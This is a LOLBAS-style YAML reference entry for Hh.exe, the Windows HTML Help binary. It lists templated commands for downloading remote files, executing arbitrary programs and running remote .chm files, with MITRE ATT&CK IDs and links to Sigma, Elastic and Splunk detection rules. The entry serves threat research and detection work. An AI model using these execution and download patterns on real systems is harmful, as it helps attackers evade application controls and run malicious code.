---
Name: Hh.exe
Description: Binary used for processing chm files in Windows
Author: Oddvar Moe
Created: 2018-05-25
Commands:
  - Command: HH.exe {REMOTEURL:.bat}
    Description: Open the target batch script with HTML Help.
    Usecase: Download files from url
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
    Tags:
      - Execute: EXE
      - Application: GUI
  - Command: HH.exe {PATH_ABSOLUTE:.exe}
    Description: Executes specified executable with HTML Help.
    Usecase: Execute process with HH.exe
    Category: Execute
    Privileges: User
    MitreID: T1218.001
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
    Tags:
      - Execute: EXE
      - Application: GUI
  - Command: HH.exe {REMOTEURL:.chm}
    Description: Executes a remote .chm file which can contain commands.
    Usecase: Execute commands with HH.exe
    Category: Execute
    Privileges: User
    MitreID: T1218.001
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
    Tags:
      - Execute: CMD
      - Execute: CHM
      - Execute: Remote
Full_Path:
  - Path: C:\Windows\hh.exe
  - Path: C:\Windows\SysWOW64\hh.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml
  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml
  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml
Resources:
  - Link: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
